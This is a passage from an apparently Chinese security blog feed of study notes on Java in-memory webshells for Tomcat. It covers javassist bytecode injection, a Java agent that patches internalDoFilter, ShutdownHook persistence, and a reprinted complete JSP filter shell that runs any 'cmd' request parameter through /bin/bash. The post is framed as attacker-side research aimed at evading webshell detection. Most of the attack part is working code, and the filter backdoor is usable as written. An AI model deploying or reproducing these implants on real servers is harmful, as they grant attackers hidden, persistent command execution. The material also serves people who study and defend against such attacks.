class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Target</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Target a = <span class="keyword">new</span> Target();</span><br><span class="line">        a.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ModifyTarget功能为利用javassist动态更改Target.class，添加一段静态代码段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClassPool</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException, IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    String command = <span class="string">&quot;open -a calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(org.m0d9.sec.JavassistDemo.Target.class));</span><br><span class="line">    CtClass cc = pool.get(org.m0d9.sec.JavassistDemo.Target.class.getName());</span><br><span class="line">    System.out.println(org.m0d9.sec.JavassistDemo.Target.class.getName());</span><br><span class="line"></span><br><span class="line">    cc.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + command.replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    <span class="comment">//加入关键执行代码，生成一个静态函数。</span></span><br><span class="line"></span><br><span class="line">    String newClassNameString = <span class="string">&quot;angelwhu.Pwner&quot;</span> + System.nanoTime();</span><br><span class="line">    cc.setName(newClassNameString);</span><br><span class="line">    <span class="comment">// 写文件</span></span><br><span class="line">    cc.writeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-112.png" alt="upload successful"></p><p>但是仅仅改动class还不够，如何替换掉正在运行的Target类呢？</p><h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><blockquote><p>java Instrumentation指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。</p></blockquote><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└── AgentMainTest.java</span><br></pre></td></tr></table></figure><p>其中AgentMainTest为Demo，agentmain为主函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包为jar需要注意，必须指定Agent-Class:为目标类，比如rebeyond师傅的memshell</p><p><code>Agent-Class:net.rebeyond.memshell.Agent</code></p><p>主要的功能逻辑在自定义Transformer 上，Transformer提供transform接口，输入可以是各种类，如果需要修改该类，改动返回新类的bytes即可</p><p>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            ClassClassPath classPath = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);  <span class="comment">//get current class&#x27;s classpath</span></span><br><span class="line">            cp.insertClassPath(classPath);  <span class="comment">//add the classpath to classpool</span></span><br><span class="line">            CtClass cc = cp.get(<span class="string">&quot;org.m0d9.sec.JavassistDemo.Target&quot;</span>);</span><br><span class="line">            CtMethod m = cc.getDeclaredMethod(<span class="string">&quot;internalDoFilter&quot;</span>);</span><br><span class="line">            m.addLocalVariable(<span class="string">&quot;elapsedTime&quot;</span>, CtClass.longType);</span><br><span class="line">            m.insertBefore(<span class="string">&quot;System.out.println(\&quot;called\&quot;);Runtime.getRuntime().exec(\&quot;open -a calculator.app\&quot;);&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;inject code done&quot;</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] byteCode = cc.toBytecode();</span><br><span class="line">            cc.detach();</span><br><span class="line">            <span class="keyword">return</span> byteCode;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;error:::::&quot;</span>+ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包为agent.jar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -javaagent:/Users/mody/study/java/MemShell/JavassistDemo/target/JavassistDemo-1.0-SNAPSHOT.jar Target</span><br></pre></td></tr></table></figure><p>可以成功在hello函数中插入弹出计算器</p><h2 id="tomcat-internalDoFilter"><a href="#tomcat-internalDoFilter" class="headerlink" title="tomcat internalDoFilter"></a>tomcat internalDoFilter</h2><p>前文servlet中有提及tomcat http请求的调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)</span><br><span class="line">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)</span><br><span class="line">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)</span><br><span class="line">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)</span><br><span class="line">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)</span><br><span class="line">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)</span><br><span class="line">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)</span><br><span class="line">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class="line">at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure><p>有了以上的基础知识，将Target类替换为internalDoFilter类即可</p><p>在internalDoFilter中插入的payload改为evil code</p><h2 id="ShutdownHook"><a href="#ShutdownHook" class="headerlink" title="ShutdownHook"></a>ShutdownHook</h2><p>JDK提供了Java.Runtime.addShutdownHook(Thread hook)方法，可以注册一个JVM关闭的钩子，这个钩子可以在一下几种场景中被调用：</p><ul><li>程序正常退出</li><li>使用System.exit()</li><li>终端使用Ctrl+C触发的中断</li><li>系统关闭</li><li>OutOfMemory宕机</li><li>使用Kill pid命令干掉进程（注：在使用kill -9 pid时，是不会被调用的）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">writeFiles(<span class="string">&quot;inject.jar&quot;</span>, Agent.injectFileBytes);</span><br><span class="line">writeFiles(<span class="string">&quot;agent.jar&quot;</span>, Agent.agentFileBytes);</span><br><span class="line">startInject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">t.setName(<span class="string">&quot;shutdown Thread&quot;</span>);</span><br><span class="line">Runtime.getRuntime().addShutdownHook(t);</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节将rebeyond 师傅首发的agent类型java内存马拆为几个关键技术点，简单的分别作了介绍，其实前两个javassist/javaagent应该还有更多的知识点。</p><p>愈发觉得java安全就像堆积木</p><p>感叹一声学海无涯</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></li><li>[2] <a href="https://github.com/jboss-javassist/javassist/wiki">javassist wiki</a></li><li>[3] <a href="https://www.cnblogs.com/rickiyang/p/11336268.html">javassist使用全解析</a></li><li>[4] <a href="https://github.com/rebeyond/memShell">memshell</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;rebeyond 师傅在参考【1】中提出利用javaagent 永久注入tomcat进程的方案，有几个重要的技术点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;javaagent技术&lt;/li&gt;
&lt;li&gt;javassist技术&lt;/li&gt;
&lt;li&gt;tomcat ApplicationFilterChain.internalDoFilter方法&lt;/li&gt;
&lt;li&gt;ShutdownHook 钩子&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;javassist技术&quot;&gt;&lt;a href=&quot;#javassist技术&quot; class=&quot;headerlink&quot; title=&quot;javassist技术&quot;&gt;&lt;/a&gt;javassist技术&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;javassist 相关文档可以参考【2】和【3】，以简单的javassist demo&lt;br&gt;为例&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="javassist" scheme="http://m0d9.me/tags/javassist/"/>
    
    <category term="javaagent" scheme="http://m0d9.me/tags/javaagent/"/>
    
    <category term="内存shell" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98shell/"/>
    
  </entry>
  
  <entry>
    <title>Java内存shell：servlet</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/</id>
    <published>2020-09-27T01:58:00.000Z</published>
    <updated>2020-10-10T13:20:18.831Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习Java内存shell相关知识，总结沉淀几篇文章，权当学习笔记了。</p><h2 id="Java内存webshell史"><a href="#Java内存webshell史" class="headerlink" title="Java内存webshell史"></a>Java内存webshell史</h2><p>直接引用c0ny1师傅的总结，写的太好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">其实内存马由来已久，早在17年n1nty师傅的《Tomcat源码调试笔记-看不见的shell》中已初见端倪，但一直不温不火。后经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的Spring controller内存马。至此内存马开枝散叶发展出了三大类型：</span><br><span class="line"></span><br><span class="line">1. servlet-api类</span><br><span class="line">filter型</span><br><span class="line">servlet型</span><br><span class="line">2. spring类</span><br><span class="line">拦截器</span><br><span class="line">controller型</span><br><span class="line">3. Java Instrumentation类</span><br><span class="line">agent型</span><br><span class="line"></span><br><span class="line">内存马这坛深巷佳酒，一时间流行于市井与弄堂之间。上至安全研究员下至普通客户，人尽皆知。正值hw来临之际，不难推测届时必将是内存马横行天下之日。而各大安全厂商却迟迟未见动静。所谓表面风平浪静，实则暗流涌动。或许一场内存马的围剿计划正慢慢展开。作为攻击方向的研究人员，没有对手就制造对手,攻防互换才能提升内存马技术的发展。</span><br></pre></td></tr></table></figure><a id="more"></a><p>D盾、安全狗，以及各云厂商对于webshell识别技术愈发成熟，webshell生存空间一直被压缩，内存shell或许可以提供新的攻防方向。</p><h2 id="n1nty师傅的jsp内存shell"><a href="#n1nty师傅的jsp内存shell" class="headerlink" title="n1nty师傅的jsp内存shell"></a>n1nty师傅的jsp内存shell</h2><p>n1nty师傅2017年的文章，见参考【1】，摘取其中重点逻辑代码</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">final</span> String name = <span class="string">&quot;n1ntyfilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">ServletContext ctx = request.getSession().getServletContext();</span><br><span class="line">Field f = ctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext appCtx = (ApplicationContext)f.get(ctx);</span><br><span class="line"></span><br><span class="line">f = appCtx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardCtx = (StandardContext)f.get(appCtx);</span><br><span class="line"></span><br><span class="line">f = standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map)f.get(standardCtx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123;</span><br><span class="line">   out.println(<span class="string">&quot;inject &quot;</span>+ name);</span><br><span class="line">   </span><br><span class="line">   Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">         HttpServletRequest req = (HttpServletRequest)arg0;</span><br><span class="line">         <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            Process p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">            <span class="keyword">int</span> len = p.getInputStream().read(data);</span><br><span class="line">            p.destroy();</span><br><span class="line">            arg1.getWriter().write(<span class="keyword">new</span> String(data, <span class="number">0</span>, len));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125; </span><br><span class="line">         arg2.doFilter(arg0, arg1);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">   </span><br><span class="line">   FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">   filterDef.setFilterName(name);</span><br><span class="line">   filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">   filterDef.setFilter(filter);</span><br><span class="line">    </span><br><span class="line">   standardCtx.addFilterDef(filterDef);</span><br><span class="line">   </span><br><span class="line">   FilterMap m = <span class="keyword">new</span> FilterMap();</span><br><span class="line">   m.setFilterName(filterDef.getFilterName());</span><br><span class="line">   m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">   m.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   standardCtx.addFilterMapBefore(m);</span><br><span class="line">   </span><br><span class="line">   Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">   constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">   FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);</span><br><span class="line">   </span><br><span class="line">   filterConfigs.put(name, filterConfig);</span><br><span class="line">   out.println(<span class="string">&quot;injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中n1nty师傅是以jsp文件方式给出，jsp运行过程中会被编译成class，然后最终交由servlet处理</p><p>这个payload为servlet内存马的filter型的实现，下面解释其原理</p><h2 id="Servlet-必备知识"><a href="#Servlet-必备知识" class="headerlink" title="Servlet 必备知识"></a>Servlet 必备知识</h2><h3 id="Demo-Code"><a href="#Demo-Code" class="headerlink" title="Demo Code"></a>Demo Code</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 执行必需的初始化</span></span><br><span class="line">        message = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                      HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 设置响应内容类型</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实际的逻辑是在这里</span></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 什么也不做</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter是过滤器，正常是在web.xml，详情可以参考【4】中的过滤器一节，总结几个要点</p><ol><li><p>Servlet Filter过滤器可以动态地拦截请求和响应，以变换或使用包含在请求或响应中的信息。</p></li><li><p>配置中指定 /* ，可适用所有servlet</p></li><li><p>web.xml 中的 filter-mapping 元素的顺序决定了 Web 容器应用过滤器到 Servlet 的顺序。若要反转过滤器的顺序，您只需要在 web.xml 文件中反转 filter-mapping 元素即可。</p></li></ol><p>问题：除了静态配置web.xml，如何动态创建Filter？</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>正常的一个Servlet调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)</span><br><span class="line">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)</span><br><span class="line">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)</span><br><span class="line">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)</span><br><span class="line">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)</span><br><span class="line">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)</span><br><span class="line">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)</span><br><span class="line">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class="line">at 